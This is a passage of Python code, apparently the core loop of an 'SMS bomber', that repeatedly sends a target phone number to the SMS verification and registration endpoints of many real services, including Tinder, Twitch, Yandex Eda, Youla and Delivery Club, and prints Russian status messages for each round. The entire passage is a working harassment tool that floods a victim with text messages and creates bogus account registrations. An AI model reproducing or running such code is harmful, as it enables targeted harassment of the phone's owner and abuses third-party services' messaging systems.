                    requests.post('https://plink.tech/register/', json={"phone": _phone})
                    print('[+] Plink отправлено!')
                except:
                    print('[-] Plink не отправлено!')

                try:
                    requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
                    print('[+] qlean отправлено!')
                except:
                    print('[-] qlean не отправлено!')

                try:
                    requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
                    print('[+] SMSgorod отправлено!')
                except:
                    print('[-] SMSgorod не отправлено!')

                try:
                    requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                                  data={'phone_number': _phone})
                    print('[+] Tinder отправлено!')
                except:
                    print('[-] Tinder не отправлено!')

                try:
                    requests.post('https://passport.twitch.tv/register?trusted_request=true',
                                  json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                        "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                        "password": password, "phone_number": _phone, "username": username})
                    print('[+] Twitch отправлено!')
                except:
                    print('[-] Twitch не отправлено!')

                try:
                    requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                                  headers={'App-ID': 'cabinet'})
                    print('[+] CabWiFi отправлено!')
                except:
                    print('[-] CabWiFi не отправлено!')

                try:
                    requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
                    print('[+] Wowworks отправлено!')
                except:
                    print('[-] Wowworks не отправлено!')

                try:
                    requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                                  json={"phone_number": "+" + _phone})
                    print('[+] Eda.Yandex отправлено!')
                except:
                    print('[-] Eda.Yandex не отправлено!')

                try:
                    requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
                    print('[+] Youla отправлено!')
                except:
                    print('[-] Youla не отправлено!')

                try:
                    requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                                  json={"client_type": "personal", "email": "{email}@gmail.ru".format(email),
                                        "mobile_phone": _phone, "deliveryOption": "sms"})
                    print('[+] Alpari отправлено!')
                except:
                    print('[-] Alpari не отправлено!')

                try:
                    requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
                                  data={"phone": _phone})
                    print('[+] SMS отправлено!')
                except:
                    print('[-] SMS не отправлено!')

                try:
                    requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
                    print('[+] Delivery отправлено!')
                except:
                    print('[-] Delivery не отправлено!')

                try:
                    iteration += 1
                    print(('{} круг пройден.').format(iteration))
                except:
                    break